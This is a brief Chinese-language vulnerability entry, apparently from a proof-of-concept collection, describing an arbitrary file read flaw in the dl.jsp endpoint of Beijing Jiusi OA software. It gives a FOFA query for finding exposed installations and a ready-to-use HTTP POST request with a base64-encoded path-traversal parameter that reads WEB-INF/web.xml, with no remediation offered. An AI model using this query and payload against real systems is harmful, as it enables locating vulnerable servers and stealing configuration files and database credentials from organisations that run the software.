# 九思OA接口dl.jsp任意文件读取漏洞

北京九思协同办公软件dl.jsp接口处存在任意文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## fofa

```javascript
body="/jsoa/login.jsp"
```

## poc

```javascript
POST /jsoa/dl.jsp?JkZpbGVOYW1lPS4uLy4uLy4uL1dFQi1JTkYvd2ViLnhtbCZwYXRoPS9h HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
```

![image-20241114140239709](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411141402862.png)